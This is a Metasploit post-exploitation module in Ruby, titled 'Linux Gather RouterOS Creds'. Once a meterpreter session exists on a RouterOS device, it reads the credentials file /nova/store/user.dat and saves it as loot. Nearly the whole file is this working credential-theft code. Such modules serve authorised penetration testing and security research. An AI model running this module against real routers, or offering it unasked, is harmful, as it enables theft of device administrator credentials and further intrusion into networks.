##
# This module requires Metasploit: https://metasploit.com/download Current source: 
# https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather RouterOS Creds',
      'Description'   => %q{
        This module downloads the credentials file from RouterOS file system.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'jabberd <@jabberd>',
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['meterpreter']
    ))
  end

  def run
    userdata = read_file('/nova/store/user.dat')
    loot_path = store_loot('mt.ros.user.dat', 'application/octet-stream', session, userdata)
    print_good("User credentials data saved to #{loot_path}")
  end
end
